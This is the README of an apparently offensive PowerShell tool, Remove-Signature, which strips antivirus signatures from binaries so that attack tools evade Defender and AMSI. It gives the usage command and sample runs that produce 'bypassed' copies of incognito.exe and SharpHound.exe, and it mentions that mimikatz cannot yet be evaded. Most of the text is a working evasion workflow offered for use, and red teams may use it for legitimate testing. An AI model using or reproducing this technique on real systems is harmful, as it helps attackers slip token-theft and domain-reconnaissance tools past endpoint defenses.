# Remove-Signature

Remove-Signature is a powershell-based tool designed to automate the process of generating a payload that can bypass anti-virus detection. 

https://www.blackhat.com/asia-23/arsenal/schedule/index.html#remove-signature-31139

## Usage

```
. '.\Remove-Signature.ps1' ; Remove-Signature -Path .\incognito.exe -AvProduct Amsi
```

* -Path: filepath
* -Force (optional) : remove signature even if it is at .text section or .idata(import name table) section
* -AvProduct (optional): av product to use for signature scanning, Defender (default) or Amsi, Kaspersky(Beta version)
  * recommended to choose Amsi since it's faster.

```
PS C:\> . '.\Remove-Signature.ps1' ; Remove-Signature -Path .\incognito.exe
[*] C:\incognito.exe has malicious signature. start removing all of them...
[*] scanning 102912 bytes
..............................................
[*] located a signature around 0001679a

0001671a 74 69 6e 67 20 74 6f 20 61 64 64 20 75 73 65 72 ting to add user
0001672a 20 25 73 20 74 6f 20 67 72 6f 75 70 20 25 73 20  %s to group %s
0001673a 6f 6e 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 6f on domain contro
0001674a 6c 6c 65 72 20 25 73 0a 00 00 4e 54 20 41 55 54 ller %s   NT AUT
0001675a 48 4f 52 49 54 59 5c 41 4e 4f 4e 59 4d 4f 55 53 HORITY\ANONYMOUS
0001676a 20 4c 4f 47 4f 4e 00 00 00 00 5b 2b 5d 20 53 75  LOGON    [+] Su
0001677a 63 63 65 73 73 66 75 6c 6c 79 20 61 64 64 65 64 ccessfully added
0001678a 20 75 73 65 72 20 74 6f 20 67 72 6f 75 70 0a 00  user to group
0001679a 00 00 5b 2d 5d 20 43 6f 6d 70 75 74 65 72 20 6e   [-] Computer n
000167aa 61 6d 65 20 69 6e 76 61 6c 69 64 0a 00 00 5b 2d ame invalid   [-
000167ba 5d 20 4f 70 65 72 61 74 69 6f 6e 20 6f 6e 6c 79 ] Operation only
000167ca 20 61 6c 6c 6f 77 65 64 20 6f 6e 20 70 72 69 6d  allowed on prim
000167da 61 72 79 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 ary domain contr
000167ea 6f 6c 6c 65 72 0a 00 00 00 00 5b 2d 5d 20 53 70 oller     [-] Sp
000167fa 65 63 69 61 6c 20 67 72 6f 75 70 0a 00 00 5b 2d ecial group   [-
0001680a 5d 20 55 73 65 72 20 6e 6f 74 20 66 6f 75 6e 64 ] User not found
[*] should be changed as follow to bypass the signature

0001671a 74 69 6e 67 20 74 6f 20 61 64 64 20 75 73 65 72 ting to add user
0001672a 20 25 73 20 74 6f 20 67 72 6f 75 70 20 25 73 20  %s to group %s
0001673a 6f 6e 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 6f on domain contro
0001674a 6c 6c 65 72 20 25 73 0a 00 00 4e 54 20 41 55 54 ller %s   NT AUT
0001675a 48 4f 52 49 54 59 5c 41 4e 4f 4e 59 4d 4f 55 53 HORITY\ANONYMOUS
0001676a 20 4c 4f 47 4f 4e 00 00 00 00 5b 2b 5d 20 53 75  LOGON    [+] Su
0001677a 63 63 65 73 73 66 75 6c 6c 79 20 61 64 64 65 64 ccessfully added
0001678a 20 75 73 65 72 20 74 6f 20 67 72 6f 75 70 41 00  user to groupA
0001679a 00 00 5b 2d 5d 20 43 6f 6d 70 75 74 65 72 20 6e   [-] Computer n
000167aa 61 6d 65 20 69 6e 76 61 6c 69 64 0a 00 00 5b 2d ame invalid   [-
000167ba 5d 20 4f 70 65 72 61 74 69 6f 6e 20 6f 6e 6c 79 ] Operation only
000167ca 20 61 6c 6c 6f 77 65 64 20 6f 6e 20 70 72 69 6d  allowed on prim
000167da 61 72 79 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 ary domain contr
000167ea 6f 6c 6c 65 72 0a 00 00 00 00 5b 2d 5d 20 53 70 oller     [-] Sp
000167fa 65 63 69 61 6c 20 67 72 6f 75 70 0a 00 00 5b 2d ecial group   [-
0001680a 5d 20 55 73 65 72 20 6e 6f 74 20 66 6f 75 6e 64 ] User not found
[+] removed all signatures. here is the output: C:\incognito.exe.bypassed
```

```
PS C:\> Remove-Signature -Path .\SharpHound.exe -AvProduct Amsi
[*] SharpHound.exe has malicious signature. start scanning 1051648 bytes...
.......................
[*] located a signature around 000ff138

000ff0b8 00 00 00 00 02 00 00 00 55 00 00 00 e8 0e 10 00     ☻   U   ?►
000ff0c8 e8 f0 0f 00 00 00 00 00 00 00 00 00 00 00 00 00 ??
000ff0d8 10 00 00 00 00 00 00 00 00 00 00 00 3d f1 0f 00 ►           =?
000ff0e8 52 53 44 53 55 3e 33 b3 4e 34 9d 49 8f 3e 78 d5 RSDSU>3?N4?I?>x?
000ff0f8 88 0c 62 8a 01 00 00 00 44 3a 5c 61 5c 53 68 61 ?
000ff108 72 70 48 6f 75 6e 64 5c 53 68 61 72 70 48 6f 75 rpHound\SharpHou
000ff118 6e 64 5c 6f 62 6a 5c 52 65 6c 65 61 73 65 5c 6e nd\obj\Release\n
000ff128 65 74 34 36 32 5c 53 68 61 72 70 48 6f 75 6e 64 et462\SharpHound
000ff138 2e 70 64 62 00 00 00 00 68 0f 10 00 00 00 00 00 .pdb    h►
000ff148 00 00 00 00 7e 0f 10 00 00 20 00 00 00 00 00 00     ~►
000ff158 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
000ff168 70 0f 10 00 00 00 00 00 00 00 5f 43 6f 72 45 78 p►       _CorEx
000ff178 65 4d 61 69 6e 00 6d 73 63 6f 72 65 65 2e 64 6c eMain mscoree.dl
000ff188 6c 00 00 00 00 00 ff 25 00 20 40 00 00 00 00 00 l     ?%  @
000ff198 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
000ff1a8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[*] should be changed as follow to bypass the signature

000ff0b8 00 00 00 00 02 00 00 00 55 00 00 00 e8 0e 10 00     ☻   U   ?►
000ff0c8 e8 f0 0f 00 00 00 00 00 00 00 00 00 00 00 00 00 ??
000ff0d8 10 00 00 00 00 00 00 00 00 00 00 00 3d f1 0f 00 ►           =?
000ff0e8 52 53 44 53 55 3e 33 b3 4e 34 9d 49 8f 3e 78 d5 RSDSU>3?N4?I?>x?
000ff0f8 88 0c 62 8a 01 00 00 00 44 3a 5c 61 5c 53 68 61 ?
000ff108 72 70 48 6f 75 6e 64 5c 53 68 61 72 70 48 6f 75 rpHound\SharpHou
000ff118 6e 64 5c 6f 62 6a 5c 52 65 6c 65 61 73 65 5c 6e nd\obj\Release\n
000ff128 65 74 34 36 32 5c 53 68 61 72 70 48 6f 75 6e 64 et462\SharpHound
000ff138 41 70 64 62 00 00 00 00 68 0f 10 00 00 00 00 00 Apdb    h►
000ff148 00 00 00 00 7e 0f 10 00 00 20 00 00 00 00 00 00     ~►
000ff158 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
000ff168 70 0f 10 00 00 00 00 00 00 00 5f 43 6f 72 45 78 p►       _CorEx
000ff178 65 4d 61 69 6e 00 6d 73 63 6f 72 65 65 2e 64 6c eMain mscoree.dl
000ff188 6c 00 00 00 00 00 ff 25 00 20 40 00 00 00 00 00 l     ?%  @
000ff198 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
000ff1a8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[+] removed all signatures. here is the output: C:\bypassed.SharpHound.exe
```

## Demo

[https://www.youtube.com/watch?v=7jtHYQ8kGCw](https://www.youtube.com/watch?v=1pQVQR1jjE8)

## Reference

* https://github.com/matterpreter/DefenderCheck
* https://github.com/rasta-mouse/ThreatCheck

## Known Issues

* cannot output bypassed version of mimikats
  * Defender has signatures in its import name table. If import table is modified to bypass the detection, mimikatz won't be launched properly.
* when Defender Cloud Protection is enabled, binaries with managed code tend to be detected. 
